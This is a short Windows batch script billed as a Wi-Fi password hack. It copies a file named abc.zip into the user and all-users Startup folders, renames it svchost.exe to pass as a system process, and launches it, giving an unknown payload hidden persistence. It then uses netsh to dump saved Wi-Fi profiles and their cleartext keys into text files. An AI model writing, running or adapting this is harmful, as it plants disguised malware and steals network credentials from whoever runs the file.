REM STORE NETWORKS IN A TXT FILE at system32, if access denied , you need admin rights
cd C:\Windows\System32
echo f|xcopy /f ".\abc.zip" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" 
rename "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\abc.zip" "svchost.exe"
start explorer "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\svchost.exe"
echo f|xcopy ".\abc.zip" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp" 
rename "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\abc.zip" "svchost.exe"

netsh wlan show profiles >  network.txt

netsh wlan show profiles name=[your wifi name] key=clear  > password.txt


msg * replace your wifiname in this cmd file
msg * Wifi password hacked
msg * run as admin if password is not shown

timeout 100

REM Retry with public roaming
cd C:\Users\Public\Roaming

netsh wlan show profiles >  network.txt

netsh wlan show profiles name=[your wifi name] key=clear  > password.txt



timeout 100
